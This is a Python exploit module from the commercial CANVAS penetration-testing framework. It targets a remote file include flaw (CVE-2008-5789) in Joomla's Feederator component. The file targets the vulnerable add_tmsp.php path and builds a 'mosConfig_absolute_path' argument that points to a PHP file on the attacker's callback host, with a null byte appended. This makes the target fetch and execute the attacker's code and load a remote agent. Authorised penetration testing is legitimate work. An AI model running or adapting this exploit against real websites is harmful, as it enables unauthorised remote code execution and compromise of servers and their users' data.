#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")
from ExploitTypes.phpexploit import *


NAME="Joomla Feederator Remote File Include"
DESCRIPTION="Poor input validation allows remote users to include remote files"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Joomla"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2008-5789"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5789"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES=""""""
CHANGELOG=""""""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.ssl=""
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath=""
        self.basepaths=["/joomla/","/"]
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.verb="GET"
        self.targetpath="administrator/components/com_feederator/includes/tmsp/add_tmsp.php"
        self.foundstrings=["joomla"] # string to look for in the testfile to find basepath
        self.webserverport=80
        self.server=None 
        self.phpfilename="test.php" # filename to include our "shellcode" in
        self.testfile="index.php"   # file to test for path with
        return

    def geturlarguments(self):
        """
        Creates our PHP include URL and places it in renderer argument
        """
        #self.neededListenerTypes()
        command="mosConfig_absolute_path=http://%s:%d/test.php\00"%(self.callback.ip, self.webserverport)
        
        return command
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
